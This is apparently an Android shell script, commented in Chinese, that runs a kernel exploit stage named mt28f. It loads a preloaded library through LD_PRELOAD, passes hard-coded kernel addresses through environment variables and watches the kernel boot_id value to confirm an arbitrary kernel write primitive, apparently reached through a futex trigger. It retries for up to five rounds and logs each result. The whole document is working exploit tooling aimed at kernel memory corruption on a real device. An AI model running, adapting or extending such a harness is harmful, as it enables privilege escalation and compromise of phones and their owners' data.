#!/system/bin/sh
# mt28f: Case-2 任意值写验证 — *(tree_left) = tree_right
# tree_right=默认 fake_lock (+8/+16=0 → Case-2), tree_left=boot_id
# Case-2 触发 → boot_id = fake_lock (0xffffff81...1350, 特征 "5013xxxx-81ff")
# Case-1(旧) → boot_id = tree_pc (c8778a02)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt28f.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt28f.txt
RUNLOG=/data/local/tmp/mt28f_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
for R in 1 2 3 4 5; do
  echo "--- round $R start $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 220 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff80028a77c8 \
    PSELECT_TREE_LEFT=ffffff80028a77d0 \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 180 > $RUNLOG 2>&1
  echo "round=$R rc=$?" >> $LOG
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "round=$R boot_id=$BID" >> $LOG
  grep -a 'SLIDE page prepared\|WRITE PRIMITIVE\|futex trigger' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  case "$BID" in
    *"1350"*) echo "★★★ CASE-2 WRITE (value=fake_lock) round=$R ★★★" >> $LOG; break;;
    c8778a02-*) echo "→ Case-1 old shape round=$R" >> $LOG;;
  esac
  sleep 3
done
echo "=== boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
